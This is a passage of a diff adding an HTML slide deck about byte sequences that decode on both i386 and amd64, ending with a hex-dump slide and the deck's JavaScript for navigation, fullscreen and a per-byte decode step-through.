+<span class="off">0080</span>  <span class="h86">6a</span> <span class="h86">04</span> <span class="h86">58</span> <span class="h86">cd</span> <span class="h86">80</span></pre>
+      <p class="note"><code>jmpasm + amd64asm + i386asm</code>, 133 bytes. The prologue runs on both CPUs and routes each into its own block.</p>
+    </section>
+  </div>
+
+  <div class="hint" id="hint">&larr; &rarr; or space to move</div>
+  <div class="ctrls">
+    <button id="prev" aria-label="Previous slide">&#9666;</button>
+    <button id="next" aria-label="Next slide">&#9656;</button>
+    <button id="full" aria-label="Toggle fullscreen">&#10530;</button>
+  </div>
+</div>
+
+<script>
+(function(){
+  var deck=document.getElementById('deck');
+  var stage=document.getElementById('stage');
+  var slides=Array.prototype.slice.call(document.querySelectorAll('.slide'));
+  var rail=document.getElementById('rail');
+  var hint=document.getElementById('hint');
+  var N=slides.length;
+
+  function fit(){
+    var s=Math.min(window.innerWidth/1280, window.innerHeight/720);
+    stage.style.transform='scale('+s+')';
+  }
+  window.addEventListener('resize',fit);
+  document.addEventListener('fullscreenchange',fit);
+  fit();
+
+  // --- per-byte step-through on the dual-decode slide ---
+  var dEl=document.getElementById('decode');
+  var dIdx=slides.indexOf(dEl);
+  var dRows=dEl?Array.prototype.slice.call(dEl.querySelectorAll('tbody tr')):[];
+  var dMax=dRows.length;
+  var dStep=dMax;
+  var genEl=document.getElementById('gen');
+  var genIdx=slides.indexOf(genEl);
+  var DST=[
+    null,
+    {e86:'0',z86:'1',e64:'0',z64:'1'},
+    {e86:'1',z86:'0',e64:'0',z64:'1'},
+    {e86:'1',z86:'0',e64:'0',z64:'1'},
+    {e86:'1',z86:'0',e64:'0',z64:'1'},
+    {e86:'1',z86:'0',e64:'0',z64:'1',g86:'jz not taken',g64:'jz taken → amd64'},
+    {e86:'1',z86:'0',e64:'0',z64:'1',g86:'jmp → i386',g64:'(not reached)'}
+  ];
+  function dv(id,v){var el=document.getElementById(id); if(el) el.textContent=(v==null?'?':v);}
+  function setDecode(s){
+    dStep=Math.max(0,Math.min(dMax,s));
+    dRows.forEach(function(r,k){
+      r.classList.toggle('ghost', k>=dStep);
+      r.classList.toggle('cur', k===dStep-1);
+    });
+    var st=DST[dStep]||{};
+    dv('e86',st.e86); dv('z86',st.z86); dv('e64',st.e64); dv('z64',st.z64);
+    dv('g86',st.g86||''); dv('g64',st.g64||'');
+  }
+
+  var i=0;
+  function clampHash(){
+    var m=/^#s(\d+)$/.exec(location.hash);
+    if(m){var n=parseInt(m[1],10)-1; if(n>=0&&n<N) i=n;}
+  }
+  clampHash();
+
+  function show(n){
+    var from=i;
+    i=Math.max(0,Math.min(N-1,n));
+    slides.forEach(function(s,k){s.classList.toggle('active',k===i);});
+    stage.setAttribute('data-i',i);
+    rail.style.width=((i+1)/N*100)+'%';
+    try{history.replaceState(null,'','#s'+(i+1));}catch(e){}
+    if(i===dIdx) setDecode(i>from ? 0 : dMax);
+    if(genEl && i===genIdx){ genEl.classList.remove('play'); void genEl.offsetWidth; genEl.classList.add('play'); }
+  }
+  show(i);
+
+  function next(){
+    if(i===dIdx && dStep<dMax){ setDecode(dStep+1); return; }
+    show(i+1);
+  }
+  function prev(){
+    if(i===dIdx && dStep>0){ setDecode(dStep-1); return; }
+    show(i-1);
+  }
+
+  document.addEventListener('keydown',function(e){
+    if(e.metaKey||e.ctrlKey||e.altKey) return;
+    switch(e.key){
+      case 'ArrowRight': case ' ': case 'PageDown': case 'l': case 'j': next(); e.preventDefault(); break;
+      case 'ArrowLeft': case 'PageUp': case 'h': case 'k': prev(); e.preventDefault(); break;
+      case 'Home': show(0); break;
+      case 'End': show(N-1); break;
+      case 'f': case 'F': toggleFull(); break;
+    }
+  });
+
+  deck.addEventListener('click',function(e){
+    if(e.target.closest('button')||e.target.closest('a')) return;
+    var x=e.clientX/window.innerWidth;
+    if(x<0.32) prev(); else next();
+  });
+
+  document.getElementById('next').addEventListener('click',next);
+  document.getElementById('prev').addEventListener('click',prev);
+
+  function toggleFull(){
+    try{
+      if(!document.fullscreenElement){ var p=document.documentElement.requestFullscreen(); if(p&&p.catch)p.catch(function(){}); }
+      else{ document.exitFullscreen&&document.exitFullscreen(); }
+    }catch(e){}
+  }
+  document.getElementById('full').addEventListener('click',toggleFull);
+
+  window.addEventListener('hashchange',function(){clampHash(); show(i);});
+
+  setTimeout(function(){hint.style.opacity='0';},3200);
+  deck.focus();
+})();
+</script>
+</body>
+</html>
